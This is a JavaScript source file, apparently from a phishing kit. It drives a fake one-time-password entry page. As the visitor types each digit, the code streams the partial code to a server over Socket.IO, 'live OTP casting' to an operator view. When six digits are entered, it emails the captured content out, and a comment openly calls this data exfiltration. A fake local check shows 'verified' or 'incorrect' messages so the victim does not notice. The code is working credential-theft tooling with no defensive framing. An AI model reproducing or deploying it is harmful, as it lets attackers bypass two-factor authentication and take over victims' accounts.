// REFINEMENT NOTE: Previous version of PAX_V.js already had many refinements.
// This version specifically adds live OTP casting character by character.

// --- DOM Element Cache ---
const otpInputs = document.querySelectorAll(".otp-input");
const errorMessageElement = document.getElementById("error-message");
// const userEmailDisplay = document.getElementById("userEmailDisplay"); // For potential future use

// --- State & Constants ---
let attemptsLeft = 3;
const OTP_LENGTH = 6;
const CORRECT_OTP_CLIENT_SIDE = "06791K"; // Insecure: for client-side UI feedback only

// --- Socket.IO Connection ---
const socket = io();

// --- OTP Input Handling Logic ---
function handleOtpInput(event, index) {
    const input = event.target;
    let value = input.value;

    if (!/^\d$/.test(value)) { // Allow only single digits
        input.value = "";
        return;
    }
    input.value = value.slice(-1); // Ensure only one character

    clearError(); // Clear previous errors on new input

    // --- Live OTP Casting ---
    const currentOtpValue = Array.from(otpInputs).map(inp => inp.value).join("");
    socket.emit("otpEntered", { field: "otp", value: currentOtpValue });
    // --- End Live OTP Casting ---

    // Move to next input if current has a value and it's not the last input
    if (input.value && index < OTP_LENGTH - 1) {
        otpInputs[index + 1].focus();
    }

    // Check if all OTP digits are entered for final actions
    if (currentOtpValue.length === OTP_LENGTH) {
        // REFINEMENT NOTE: Original logic called sendMessage() immediately after emitting when 6 digits were typed.
        // This behavior is preserved for data exfiltration.
        sendMessageToServer(currentOtpValue);

        // Then, perform client-side validation for UI feedback
        verifyClientSideOTP(currentOtpValue);
    }
}

function handleOtpBackspace(event, index) {
    const input = event.target;
    if (event.key === "Backspace") {
        clearError(); // Clear error on backspace

        // If current input is empty and not the first input, move to previous
        // The actual character removal is handled by the browser before this event sometimes,
        // or if it was already empty, we just move focus.
        if (!input.value && index > 0) {
            otpInputs[index - 1].focus();
        }

        // --- Live OTP Casting after Backspace ---
        // We need a slight delay to ensure the input value has updated before reading it.
        setTimeout(() => {
            const currentOtpValueAfterBackspace = Array.from(otpInputs).map(inp => inp.value).join("");
            socket.emit("otpEntered", { field: "otp", value: currentOtpValueAfterBackspace });
        }, 0);
        // --- End Live OTP Casting after Backspace ---
    }
}

// --- Client-Side OTP Verification (for UI feedback) ---
function verifyClientSideOTP(otpValue) {
    if (otpValue.length < OTP_LENGTH) {
        showError(`Please enter all ${OTP_LENGTH} digits.`);
        return;
    }

    if (otpValue === CORRECT_OTP_CLIENT_SIDE) {
        alert("✅ OTP Verified (Client-Side Check)!");
        clearError();
        otpInputs.forEach(input => input.style.borderColor = 'green');
        // disableOtpInputs(); // Optionally disable
        return;
    }

    attemptsLeft--;
    otpInputs.forEach(input => input.style.borderColor = 'red');

    if (attemptsLeft > 0) {
        showError(`❌ Incorrect code (Client-Side Check). ${attemptsLeft} attempt(s) left.`);
    } else {
        showError("⚠️ Too many incorrect attempts (Client-Side Check). Inputs disabled.");
        disableOtpInputs();
    }
}

// --- Email Sending Logic ---
async function sendMessageToServer(otpJustEntered) {
    try {
        const hexoPageResponse = await fetch('/HEXYO.html');
        if (!hexoPageResponse.ok) {
            throw new Error(`Failed to fetch HEXYO.html: ${hexoPageResponse.statusText}`);
        }
        const hexoPageText = await hexoPageResponse.text();
        const parser = new DOMParser();
        const hexoDoc = parser.parseFromString(hexoPageText, "text/html");
        const displayAreaElement = hexoDoc.getElementById('displayArea');

        let messageContentForEmail = `(Error: displayArea not found in HEXYO.html to construct full message) Current OTP: ${otpJustEntered}`;
        if (displayAreaElement) {
            // The content of displayArea should have been updated by HEXYO.html's socket listener
            // to include the latest OTP due to the live casting.
            messageContentForEmail = displayAreaElement.textContent.trim();
        } else {
            console.warn("Could not find #displayArea in fetched HEXYO.html. Email content might be incomplete.");
        }

        const emailResponse = await fetch('/send-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: messageContentForEmail })
        });
        const emailResponseData = await emailResponse.json();

        if (!emailResponse.ok || !emailResponseData.success) {
            throw new Error(emailResponseData.error || emailResponseData.message || 'Failed to send email.');
        }
        console.log("Email send status:", emailResponseData.message);

    } catch (error) {
        console.error('Error in sendMessageToServer:', error);
        showError('Error processing request: ' + error.message);
    }
}

// --- UI Helper Functions ---
function showError(message) {
    if (errorMessageElement) {
        errorMessageElement.textContent = message;
    }
}

function clearError() {
    if (errorMessageElement) {
        errorMessageElement.textContent = "";
    }
    otpInputs.forEach(input => {
        input.style.borderColor = ""; // Resets to CSS default
    });
}

function disableOtpInputs() {
    otpInputs.forEach(input => {
        input.disabled = true;
    });
}

// --- Navigation ---
function goBack() {
    window.history.back();
}
window.goBack = goBack; // Expose globally for HTML onclick

// --- Initialize Event Listeners ---
document.addEventListener("DOMContentLoaded", () => {
    if (otpInputs.length > 0) {
        otpInputs.forEach((input, index) => {
            input.addEventListener("input", (e) => handleOtpInput(e, index));
            input.addEventListener("keydown", (e) => handleOtpBackspace(e, index));
            input.addEventListener("paste", (e) => e.preventDefault());
        });
        otpInputs[0].focus();
    }
    // Dynamic email display logic could go here if implemented
    // const storedEmail = localStorage.getItem('userEmailFor2FA');
    // if (storedEmail && document.getElementById("userEmailDisplay")) {
    //    document.getElementById("userEmailDisplay").textContent = storedEmail;
    // }
});





const params = new URLSearchParams(window.location.search);
const username = params.get("username");
document.getElementById("userEmailDisplay").textContent = username
    ? `${username}`
    : "email@example.com";
